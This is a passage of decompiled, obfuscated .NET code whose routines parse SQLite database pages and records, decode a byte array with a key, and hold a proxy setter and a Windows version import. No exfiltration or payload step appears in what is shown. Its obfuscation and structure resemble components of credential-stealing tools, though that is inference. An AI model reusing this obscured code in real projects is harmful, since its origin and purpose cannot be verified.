          {
            *(short*) ((IntPtr) voidPtr + 58) = (short) checked ((ushort) \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(obj1), 12M), new Decimal(*(int*) unchecked ((IntPtr) voidPtr + 44) * 2))), 2));
            if (Decimal.Compare(new Decimal(obj1), 100M) == 0)
              \u0007.\u0001(obj0, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(\u0007.\u0001((int) *(ushort*) ((IntPtr) voidPtr + 58), 4)), 1M), new Decimal((int) \u0003.\u0001.\u0001))));
            else
              \u0007.\u0001(obj0, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(\u0007.\u0001(checked ((int) (obj1 + (ulong) *(ushort*) unchecked ((IntPtr) voidPtr + 58))), 4)), 1M), new Decimal((int) \u0003.\u0001.\u0001))));
            *(int*) ((IntPtr) voidPtr + 44) = checked (*(int*) unchecked ((IntPtr) voidPtr + 44) + 1);
          }
          \u0007.\u0001(obj0, Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(\u0007.\u0001(Convert.ToInt32(Decimal.Add(new Decimal(obj1), 8M)), 4)), 1M), new Decimal((int) \u0003.\u0001.\u0001))));
          return;
        }
        *(short*) ((IntPtr) voidPtr + 56) = (short) Convert.ToUInt16(Decimal.Subtract(new Decimal(\u0007.\u0001(Convert.ToInt32(Decimal.Add(new Decimal(obj1), 3M)), 2)), 1M));
        *(int*) ((IntPtr) voidPtr + 24) = 0;
        if (\u0003.\u0001.\u0001 != null)
        {
          *(int*) ((IntPtr) voidPtr + 24) = \u0003.\u0001.\u0001.Length;
          \u0003.\u0001.\u0001 = (\u0003.\u0001.\u0003[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) \u0003.\u0001.\u0001, (Array) new \u0003.\u0001.\u0003[checked (\u0003.\u0001.\u0001.Length + (int) *(ushort*) unchecked ((IntPtr) voidPtr + 56) + 1)]);
        }
        else
          \u0003.\u0001.\u0001 = new \u0003.\u0001.\u0003[checked ((int) *(ushort*) unchecked ((IntPtr) voidPtr + 56) + 1)];
        IntPtr num3 = (IntPtr) voidPtr + 28;
        *(int*) ((IntPtr) voidPtr + 48) = (int) *(ushort*) ((IntPtr) voidPtr + 56);
        *(int*) num3 = 0;
        while (*(int*) ((IntPtr) voidPtr + 28) <= *(int*) ((IntPtr) voidPtr + 48))
        {
          *(long*) voidPtr = (long) \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(obj1), 8M), new Decimal(checked (*(int*) unchecked ((IntPtr) voidPtr + 28) * 2)))), 2);
          if (Decimal.Compare(new Decimal(obj1), 100M) != 0)
            *(long*) voidPtr = (long) checked (unchecked ((ulong) *(long*) voidPtr) + obj1);
          *(int*) ((IntPtr) voidPtr + 36) = \u0007.\u0001(checked ((int) (ulong) *(long*) voidPtr));
          *(long*) ((IntPtr) voidPtr + 16) = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 36), checked ((int) (ulong) *(long*) voidPtr));
          *(int*) ((IntPtr) voidPtr + 32) = \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), Decimal.Subtract(new Decimal(*(int*) ((IntPtr) voidPtr + 36)), new Decimal((ulong) *(long*) voidPtr))), 1M)));
          \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0001 = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 32), Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), Decimal.Subtract(new Decimal(*(int*) ((IntPtr) voidPtr + 36)), new Decimal((ulong) *(long*) voidPtr))), 1M)));
          *(long*) voidPtr = (long) Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), Decimal.Subtract(new Decimal(*(int*) ((IntPtr) voidPtr + 32)), new Decimal((ulong) *(long*) voidPtr))), 1M));
          *(int*) ((IntPtr) voidPtr + 36) = \u0007.\u0001(checked ((int) (ulong) *(long*) voidPtr));
          *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 36);
          *(long*) ((IntPtr) voidPtr + 8) = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 36), checked ((int) (ulong) *(long*) voidPtr));
          numArray = new long[5];
          *(int*) ((IntPtr) voidPtr + 40) = 0;
          do
          {
            *(int*) ((IntPtr) voidPtr + 36) = checked (*(int*) unchecked ((IntPtr) voidPtr + 32) + 1);
            *(int*) ((IntPtr) voidPtr + 32) = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 36));
            numArray[*(int*) ((IntPtr) voidPtr + 40)] = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 32), *(int*) ((IntPtr) voidPtr + 36));
            if (numArray[*(int*) ((IntPtr) voidPtr + 40)] > 9L)
            {
              if (\u0007.\u0001(numArray[*(int*) ((IntPtr) voidPtr + 40)]))
                numArray[*(int*) ((IntPtr) voidPtr + 40)] = checked ((long) Math.Round(unchecked ((double) checked (numArray[*(int*) unchecked ((IntPtr) voidPtr + 40)] - 13L) / 2.0)));
              else
                numArray[*(int*) ((IntPtr) voidPtr + 40)] = checked ((long) Math.Round(unchecked ((double) checked (numArray[*(int*) unchecked ((IntPtr) voidPtr + 40)] - 12L) / 2.0)));
            }
            else
              numArray[*(int*) ((IntPtr) voidPtr + 40)] = (long) \u0003.\u0001.\u0002[checked ((int) numArray[*(int*) unchecked ((IntPtr) voidPtr + 40)])];
            *(int*) ((IntPtr) voidPtr + 40) = checked (*(int*) unchecked ((IntPtr) voidPtr + 40) + 1);
          }
          while (*(int*) ((IntPtr) voidPtr + 40) <= 4);
          if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 1M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0001 = Encoding.Default.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8)))), checked ((int) numArray[0]));
          else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 2M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0001 = Encoding.Unicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8)))), checked ((int) numArray[0]));
          else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 3M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0001 = Encoding.BigEndianUnicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8)))), checked ((int) numArray[0]));
          if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 1M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0002 = Encoding.Default.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(numArray[0]))), checked ((int) numArray[1]));
          else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 2M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0002 = Encoding.Unicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(numArray[0]))), checked ((int) numArray[1]));
          else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 3M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0002 = Encoding.BigEndianUnicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(numArray[0]))), checked ((int) numArray[1]));
          \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0002 = checked ((long) \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) unchecked ((IntPtr) voidPtr + 8))), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2]))), (int) numArray[3]));
          if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 1M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0004 = Encoding.Default.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
          else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 2M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0004 = Encoding.Unicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
          else if (Decimal.Compare(new Decimal(\u0003.\u0001.\u0001), 3M) == 0)
            \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + *(int*) unchecked ((IntPtr) voidPtr + 28))].\u0004 = Encoding.BigEndianUnicode.GetString(\u0003.\u0001.\u0001, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(long*) ((IntPtr) voidPtr + 8))), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
          *(int*) ((IntPtr) voidPtr + 28) = checked (*(int*) unchecked ((IntPtr) voidPtr + 28) + 1);
        }
        return;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[17]
        {
          (object) (ulong) *(long*) voidPtr,
          (object) *(ushort*) ((IntPtr) voidPtr + 56),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) numArray,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(long*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(long*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) *(ushort*) ((IntPtr) voidPtr + 58),
          (object) *(ushort*) ((IntPtr) voidPtr + 60),
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) obj0,
          (object) obj1
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
label_46:
      voidPtr = (void*) num1;
      goto label_1;
    }

    [DllImport("kernel32.Dll", EntryPoint = "GetVersionEx")]
    static extern short \u0001([In] ref \u0003.\u0004.\u0001 obj0);

    static void \u0001([In] Exception obj0) => \u0007.\u0001(obj0, new object[0]);

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5)
    {
      \u0007.\u0001(obj0, new object[5]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5
      });
    }

    static void \u0001([In] \u000F.\u0006.\u0003 obj0, [In] int obj1)
    {
      int num1;
      try
      {
        \u000F.\u0006.\u0003 obj2 = obj0;
        int num2;
        num1 = num2 = obj2.\u0002;
        obj2.\u0002 = num2 + 1;
        if (num1 == 32768)
          throw new InvalidOperationException();
        byte[] numArray = obj0.\u0001;
        \u000F.\u0006.\u0003 obj3 = obj0;
        int num3;
        num1 = num3 = obj3.\u0001;
        obj3.\u0001 = num3 + 1;
        int index = num1;
        int num4 = (int) (byte) obj1;
        numArray[index] = (byte) num4;
        obj0.\u0001 &= (int) short.MaxValue;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static void \u0001([In] IWebProxy obj0, [In] \u000E.\u0004 obj1) => obj1.\u0001 = obj0;

    static string \u0001([In] int obj0, [In] int obj1)
    {
      string str1;
      try
      {
        if (true)
        {
          int num1 = obj0;
          int num2 = \u0003.\u0001.\u0001.Length;
          int num3;
          int num4;
          while (true)
          {
            if (true)
              num2 = num2;
            if (num1 < num2)
            {
              num3 = obj1;
              int length = \u0003.\u0001.\u0001[obj0].\u0001.Length;
              if (false)
              {
                num2 = length;
                num1 = num3;
              }
              else
              {
                num4 = length;
                if (false)
                {
                  num2 = num4;
                  num1 = num3;
                }
                else
                  goto label_6;
              }
            }
            else
              break;
          }
          string str2 = (string) null;
          goto label_14;
label_6:
          if (num3 >= num4)
          {
            if (true)
              str2 = (string) null;
            else
              goto label_16;
          }
          else
            str2 = \u0003.\u0001.\u0001[obj0].\u0001[obj1];
label_14:
          str1 = str2;
        }
      }
      catch (Exception ex)
      {
        string str3;
        string str4 = str3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) str4, (object) local1, (object) local2);
        throw;
      }
label_16:
      return str1;
    }

    static unsafe long \u0001([In] int obj0, [In] int obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(41);
      byte[] numArray;
      try
      {
        checked { obj0++; }
        numArray = new byte[8];
        *(int*) ((IntPtr) voidPtr + 24) = checked (obj0 - obj1);
        *(sbyte*) ((IntPtr) voidPtr + 40) = (sbyte) 0;
        if (*(int*) ((IntPtr) voidPtr + 24) == 0 | *(int*) ((IntPtr) voidPtr + 24) > 9)
          *(long*) voidPtr = 0L;
        else if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          numArray[0] = checked ((byte) ((int) \u0003.\u0001.\u0001[obj1] & (int) sbyte.MaxValue));
          *(long*) voidPtr = BitConverter.ToInt64(numArray, 0);
        }
        else
        {
          if (*(int*) ((IntPtr) voidPtr + 24) == 9)
            *(sbyte*) ((IntPtr) voidPtr + 40) = (sbyte) 1;
          *(int*) ((IntPtr) voidPtr + 16) = 1;
          *(int*) ((IntPtr) voidPtr + 20) = 7;
          *(int*) ((IntPtr) voidPtr + 28) = 0;
          if (*(sbyte*) ((IntPtr) voidPtr + 40) != (sbyte) 0)
          {
            numArray[0] = \u0003.\u0001.\u0001[checked (obj0 - 1)];
            checked { --obj0; }
            *(int*) ((IntPtr) voidPtr + 28) = 1;
          }
          IntPtr num1 = (IntPtr) voidPtr + 32;
          int num2 = checked (obj0 - 1);
          *(int*) ((IntPtr) voidPtr + 36) = obj1;
          *(int*) num1 = num2;
          while (*(int*) ((IntPtr) voidPtr + 32) >= *(int*) ((IntPtr) voidPtr + 36))
          {
            if (checked (*(int*) unchecked ((IntPtr) voidPtr + 32) - 1) >= obj1)
            {
              numArray[*(int*) ((IntPtr) voidPtr + 28)] = checked ((byte) ((int) unchecked ((byte) ((uint) \u0003.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 32)] >> (checked (*(int*) unchecked ((IntPtr) voidPtr + 16) - 1) & 7))) & (int) byte.MaxValue >> *(int*) unchecked ((IntPtr) voidPtr + 16) | (int) unchecked ((byte) ((uint) \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 32) - 1)] << (*(int*) ((IntPtr) voidPtr + 20) & 7)))));
              *(int*) ((IntPtr) voidPtr + 16) = checked (*(int*) unchecked ((IntPtr) voidPtr + 16) + 1);
              *(int*) ((IntPtr) voidPtr + 28) = checked (*(int*) unchecked ((IntPtr) voidPtr + 28) + 1);
              *(int*) ((IntPtr) voidPtr + 20) = checked (*(int*) unchecked ((IntPtr) voidPtr + 20) - 1);
            }
            else if (*(sbyte*) ((IntPtr) voidPtr + 40) == (sbyte) 0)
              numArray[*(int*) ((IntPtr) voidPtr + 28)] = checked ((byte) ((int) unchecked ((byte) ((uint) \u0003.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 32)] >> (checked (*(int*) unchecked ((IntPtr) voidPtr + 16) - 1) & 7))) & (int) byte.MaxValue >> *(int*) unchecked ((IntPtr) voidPtr + 16)));
            *(int*) ((IntPtr) voidPtr + 32) = checked (*(int*) unchecked ((IntPtr) voidPtr + 32) - 1);
          }
          *(long*) voidPtr = BitConverter.ToInt64(numArray, 0);
        }
        *(long*) ((IntPtr) voidPtr + 8) = *(long*) voidPtr;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[11]
        {
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 40),
          (object) *(long*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) numArray,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) obj1,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
      return *(long*) ((IntPtr) voidPtr + 8);
    }

    static unsafe byte[] \u0001([In] byte[] obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(14);
      byte[] numArray1;
      byte[] numArray2;
      try
      {
        *(int*) voidPtr = (int) obj0[checked (obj0.Length - 1)];
        numArray1 = new byte[checked (obj0.Length - 2 + 1)];
        *(short*) ((IntPtr) voidPtr + 12) = (short) 0;
        try
        {
          IntPtr num1 = (IntPtr) voidPtr + 4;
          *(int*) ((IntPtr) voidPtr + 8) = checked (obj0.Length - 2);
          *(int*) num1 = 0;
          while (true)
          {
            int num2 = *(int*) ((IntPtr) voidPtr + 4);
            if (true)
              goto label_10;
label_4:
            int length = obj1.Length;
            if (num2 >= length)
              *(short*) ((IntPtr) voidPtr + 12) = (short) 0;
            if (*(int*) ((IntPtr) voidPtr + 4) < checked (obj0.Length - 1))
            {
              numArray1[*(int*) ((IntPtr) voidPtr + 4)] = Convert.ToByte(checked ((int) obj0[*(int*) unchecked ((IntPtr) voidPtr + 4)] - unchecked (numArray1.Length % obj1.Length) - (int) obj1[(int) *(short*) unchecked ((IntPtr) voidPtr + 12)] + *(int*) voidPtr));
              *(short*) ((IntPtr) voidPtr + 12) = checked ((short) ((int) *(short*) unchecked ((IntPtr) voidPtr + 12) + 1));
            }
            *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            continue;
label_10:
            int num3 = *(int*) ((IntPtr) voidPtr + 8);
            if (num2 <= num3)
            {
              num2 = (int) *(short*) ((IntPtr) voidPtr + 12);
              goto label_4;
            }
            else
              break;
          }
          numArray2 = numArray1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          numArray2 = numArray1;
          ProjectData.ClearProjectError();
        }
        return numArray2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<short> local2 = (ValueType) *(short*) ((IntPtr) voidPtr + 12);
        byte[] numArray3 = numArray2;
        byte[] numArray4 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        byte[] numArray5 = obj0;
        byte[] numArray6 = obj1;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) numArray3, (object) numArray4, (object) local3, (object) local4, (object) numArray5, (object) numArray6);
        throw;
      }
    }

    static void \u0001([In] EventHandler obj0, [In] \u0002.\u0003 obj1)
    {
      EventHandler eventHandler1;
      if (true)
      {
        if (true)
          eventHandler1 = obj1.\u0001;
      }
      else
        goto label_5;
label_2:
      EventHandler comparand;
      if (true)
      {
        EventHandler eventHandler2 = eventHandler1;
        if (true)
        {
          comparand = eventHandler2;
          goto label_9;
        }
        else
          goto label_9;
      }
label_4:
      if (eventHandler1 != comparand)
        goto label_2;
label_5:
      if (true)
        return;
label_9:
      EventHandler eventHandler3 = comparand + obj0;
      eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref obj1.\u0001, eventHandler3, comparand);
      goto label_4;
    }

    static unsafe bool \u0001([In] ulong obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(84);
      \u0003.\u0001.\u0001[] arySrc;
      try
      {
        if (\u0003.\u0001.\u0001[checked ((int) obj0)] != (byte) 13)
        {
          if (\u0003.\u0001.\u0001[checked ((int) obj0)] == (byte) 5)
          {
            *(short*) ((IntPtr) voidPtr + 80) = (short) Convert.ToUInt16(Decimal.Subtract(new Decimal(\u0007.\u0001(Convert.ToInt32(Decimal.Add(new Decimal(obj0), 3M)), 2)), 1M));
            IntPtr num = (IntPtr) voidPtr + 60;
            *(int*) ((IntPtr) voidPtr + 72) = (int) *(ushort*) ((IntPtr) voidPtr + 80);
            *(int*) num = 0;
            while (*(int*) ((IntPtr) voidPtr + 60) <= *(int*) ((IntPtr) voidPtr + 72))
            {
              *(short*) ((IntPtr) voidPtr + 78) = (short) checked ((ushort) \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(obj0), 12M), new Decimal(*(int*) unchecked ((IntPtr) voidPtr + 60) * 2))), 2));
              \u0007.\u0001(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(\u0007.\u0001(checked ((int) (obj0 + (ulong) *(ushort*) unchecked ((IntPtr) voidPtr + 78))), 4)), 1M), new Decimal((int) \u0003.\u0001.\u0001))));
              *(int*) ((IntPtr) voidPtr + 60) = checked (*(int*) unchecked ((IntPtr) voidPtr + 60) + 1);
            }
            \u0007.\u0001(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(\u0007.\u0001(Convert.ToInt32(Decimal.Add(new Decimal(obj0), 8M)), 4)), 1M), new Decimal((int) \u0003.\u0001.\u0001))));
          }
        }
        else
          goto label_36;
label_35:
        *(sbyte*) ((IntPtr) voidPtr + 82) = (sbyte) 1;
        *(sbyte*) ((IntPtr) voidPtr + 83) = *(sbyte*) ((IntPtr) voidPtr + 82);
        goto label_38;
label_36:
        *(short*) ((IntPtr) voidPtr + 76) = (short) Convert.ToUInt16(Decimal.Subtract(new Decimal(\u0007.\u0001(Convert.ToInt32(Decimal.Add(new Decimal(obj0), 3M)), 2)), 1M));
        *(int*) ((IntPtr) voidPtr + 36) = 0;
        if (\u0003.\u0001.\u0001 != null)
        {
          *(int*) ((IntPtr) voidPtr + 36) = \u0003.\u0001.\u0001.Length;
          \u0003.\u0001.\u0001 = (\u0003.\u0001.\u0002[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) \u0003.\u0001.\u0001, (Array) new \u0003.\u0001.\u0002[checked (\u0003.\u0001.\u0001.Length + (int) *(ushort*) unchecked ((IntPtr) voidPtr + 76) + 1)]);
        }
        else
          \u0003.\u0001.\u0001 = new \u0003.\u0001.\u0002[checked ((int) *(ushort*) unchecked ((IntPtr) voidPtr + 76) + 1)];
        IntPtr num1 = (IntPtr) voidPtr + 32;
        *(int*) ((IntPtr) voidPtr + 64) = (int) *(ushort*) ((IntPtr) voidPtr + 76);
        *(int*) num1 = 0;
        while (*(int*) ((IntPtr) voidPtr + 32) <= *(int*) ((IntPtr) voidPtr + 64))
        {
          *(long*) voidPtr = (long) \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(obj0), 8M), new Decimal(checked (*(int*) unchecked ((IntPtr) voidPtr + 32) * 2)))), 2);
          if (Decimal.Compare(new Decimal(obj0), 100M) != 0)
            *(long*) voidPtr = (long) checked (unchecked ((ulong) *(long*) voidPtr) + obj0);
          *(int*) ((IntPtr) voidPtr + 44) = \u0007.\u0001(checked ((int) (ulong) *(long*) voidPtr));
          *(long*) ((IntPtr) voidPtr + 16) = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 44), checked ((int) (ulong) *(long*) voidPtr));
          *(int*) ((IntPtr) voidPtr + 40) = \u0007.\u0001(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), Decimal.Subtract(new Decimal(*(int*) ((IntPtr) voidPtr + 44)), new Decimal((ulong) *(long*) voidPtr))), 1M)));
          \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001 = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 40), Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), Decimal.Subtract(new Decimal(*(int*) ((IntPtr) voidPtr + 44)), new Decimal((ulong) *(long*) voidPtr))), 1M)));
          *(long*) voidPtr = (long) Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal((ulong) *(long*) voidPtr), Decimal.Subtract(new Decimal(*(int*) ((IntPtr) voidPtr + 40)), new Decimal((ulong) *(long*) voidPtr))), 1M));
          *(int*) ((IntPtr) voidPtr + 44) = \u0007.\u0001(checked ((int) (ulong) *(long*) voidPtr));
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 44);
          *(long*) ((IntPtr) voidPtr + 8) = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 44), checked ((int) (ulong) *(long*) voidPtr));
          *(long*) ((IntPtr) voidPtr + 24) = Convert.ToInt64(Decimal.Add(Decimal.Subtract(new Decimal((ulong) *(long*) voidPtr), new Decimal(*(int*) ((IntPtr) voidPtr + 44))), 1M));
          *(int*) ((IntPtr) voidPtr + 52) = 0;
          while (*(long*) ((IntPtr) voidPtr + 24) < *(long*) ((IntPtr) voidPtr + 8))
          {
            arySrc = (\u0003.\u0001.\u0001[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 52) + 1)]);
            *(int*) ((IntPtr) voidPtr + 44) = checked (*(int*) unchecked ((IntPtr) voidPtr + 40) + 1);
            *(int*) ((IntPtr) voidPtr + 40) = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 44));
            arySrc[*(int*) ((IntPtr) voidPtr + 52)].\u0002 = \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 40), *(int*) ((IntPtr) voidPtr + 44));
            if (arySrc[*(int*) ((IntPtr) voidPtr + 52)].\u0002 > 9L)
            {
              if (\u0007.\u0001(arySrc[*(int*) ((IntPtr) voidPtr + 52)].\u0002))
                arySrc[*(int*) ((IntPtr) voidPtr + 52)].\u0001 = checked ((long) Math.Round(unchecked ((double) checked (arySrc[*(int*) unchecked ((IntPtr) voidPtr + 52)].\u0002 - 13L) / 2.0)));
              else
                arySrc[*(int*) ((IntPtr) voidPtr + 52)].\u0001 = checked ((long) Math.Round(unchecked ((double) checked (arySrc[*(int*) unchecked ((IntPtr) voidPtr + 52)].\u0002 - 12L) / 2.0)));
            }
            else
              arySrc[*(int*) ((IntPtr) voidPtr + 52)].\u0001 = (long) \u0003.\u0001.\u0002[checked ((int) arySrc[*(int*) unchecked ((IntPtr) voidPtr + 52)].\u0002)];
            *(long*) ((IntPtr) voidPtr + 24) = checked (*(long*) unchecked ((IntPtr) voidPtr + 24) + (long) (*(int*) unchecked ((IntPtr) voidPtr + 40) - *(int*) unchecked ((IntPtr) voidPtr + 44)) + 1L);
            *(int*) ((IntPtr) voidPtr + 52) = checked (*(int*) unchecked ((IntPtr) voidPtr + 52) + 1);
          }
          \u0003.\u0001.\u0001[checked (*(int*) unchecked ((IntPtr) voidPtr + 36) + *(int*) unchecked ((IntPtr) voidPtr + 32))].\u0001 = new string[checked (arySrc.Length - 1 + 1)];
          *(int*) ((IntPtr) voidPtr + 48) = 0;
          IntPtr num2 = (IntPtr) voidPtr + 56;
          *(int*) ((IntPtr) voidPtr + 68) = checked (arySrc.Length - 1);
